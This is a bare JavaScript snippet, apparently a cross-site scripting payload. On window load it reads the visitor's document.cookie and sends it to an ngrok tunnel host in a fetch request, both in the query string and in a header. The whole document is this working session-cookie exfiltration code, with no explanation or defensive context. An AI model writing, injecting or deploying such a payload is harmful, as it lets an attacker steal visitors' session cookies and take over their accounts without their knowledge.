window.onload = function() {
  fetch('https://0427-69-255-41-193.ngrok.io?cookie=' + encodeURIComponent(document.cookie), {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': document.cookie
    }
  });
};